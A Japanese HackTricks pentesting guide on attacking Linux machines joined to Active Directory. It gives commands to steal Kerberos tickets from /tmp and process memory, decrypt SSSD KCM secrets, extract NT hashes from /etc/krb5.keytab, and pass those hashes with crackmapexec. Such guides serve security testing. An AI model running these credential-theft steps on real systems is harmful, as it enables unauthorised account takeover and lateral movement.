# Linux Active Directory

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

Active Directory環境内にはLinuxマシンも存在する可能性があります。

AD内のLinuxマシンでは、**異なるCCACHEチケットがファイル内に保存されている場合があります。これらのチケットは他のKerberosチケットと同様に使用および悪用できます**。これらのチケットを読むには、チケットの所有者であるユーザーまたは**マシン内のroot**である必要があります。

## 列挙

### LinuxからのAD列挙

Linux（またはWindowsのbash）でADにアクセス権がある場合、ADを列挙するために[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を試すことができます。

**LinuxからADを列挙する他の方法**を学ぶには、次のページをチェックしてください：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPAは、主に**Unix**環境向けのMicrosoft Windows **Active Directory**のオープンソース**代替**です。完全な**LDAPディレクトリ**とActive Directoryに似た管理のためのMIT **Kerberos** Key Distribution Centerを組み合わせています。CA＆RA証明書管理のためのDogtag **Certificate System**を利用し、スマートカードを含む**マルチファクタ**認証をサポートしています。Unix認証プロセスにはSSSDが統合されています。詳細については、以下を参照してください：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## チケット操作

### パスザチケット

このページでは、Linuxホスト内で**kerberosチケットを見つけることができるさまざまな場所**を見つけることができます。次のページでは、これらのCCacheチケット形式をWindowsで使用する必要があるKirbi形式に変換する方法や、PTT攻撃を実行する方法について学ぶことができます：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmpからのCCACHEチケット再利用

CCACHEファイルは、通常、`/tmp`内で600の権限で保存される**Kerberos資格情報を格納するバイナリ形式**です。これらのファイルは、ユーザーのUIDに対応する**名前形式`krb5cc_%{uid}`**で識別できます。認証チケットの検証には、環境変数`KRB5CCNAME`を希望のチケットファイルのパスに設定する必要があり、その再利用が可能になります。

認証に使用されている現在のチケットをリストアップするには、`env | grep KRB5CCNAME`を使用します。形式はポータブルであり、環境変数を設定することでチケットを再利用できます。`export KRB5CCNAME=/tmp/ticket.ccache`として環境変数を設定することで、チケットを再利用できます。Kerberosチケットの名前形式は`krb5cc_%{uid}`であり、uidはユーザーのUIDです。
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### キーリングからのCCACHEチケット再利用

**プロセスのメモリに保存されたKerberosチケットは抽出可能**であり、特にマシンのptrace保護が無効になっている場合(`/proc/sys/kernel/yama/ptrace_scope`)。この目的のための便利なツールは[https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)で見つけることができ、セッションにインジェクトして`/tmp`にチケットをダンプすることで抽出を容易にします。

このツールを構成して使用するためには、以下の手順に従います：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順では、さまざまなセッションにインジェクトを試み、抽出されたチケットを `/tmp` に `__krb_UID.ccache` の命名規則で保存して成功を示します。

### SSSD KCM からの CCACHE チケット再利用

SSSD は、パス `/var/lib/sss/secrets/secrets.ldb` にデータベースのコピーを維持します。対応するキーは、パス `/var/lib/sss/secrets/.secrets.mkey` に隠しファイルとして保存されます。デフォルトでは、このキーは **root** 権限を持っている場合にのみ読み取り可能です。

\*\*`SSSDKCMExtractor` \*\* を --database と --key パラメータと共に呼び出すと、データベースを解析し、秘密情報を **復号** します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**資格情報キャッシュKerberos blobは、Mimikatz/Rubeusに渡すことができる使用可能なKerberos CCacheファイルに変換できます。**

### キータブからのCCACHEチケット再利用
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab からアカウントを抽出する

ルート権限で動作するサービスに必要なサービスアカウントキーは、**`/etc/krb5.keytab`** ファイルに安全に保存されています。これらのキーは、サービス用のパスワードに類似し、厳格な機密性が求められます。

キータブファイルの内容を調査するには、**`klist`** を使用できます。このツールは、**NT ハッシュ**を含むキーの詳細を表示するよう設計されており、特にキータイプが23と識別された場合には、ユーザー認証に使用されます。
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linuxユーザーにとって、**`KeyTabExtract`**はRC4 HMACハッシュを抽出する機能を提供し、NTLMハッシュの再利用に活用できます。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOSでは、**`bifrost`** はkeytabファイルの解析ツールとして機能します。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出されたアカウントとハッシュ情報を利用して、**`crackmapexec`**などのツールを使用してサーバーへの接続を確立できます。
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## 参考文献
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。

</details>
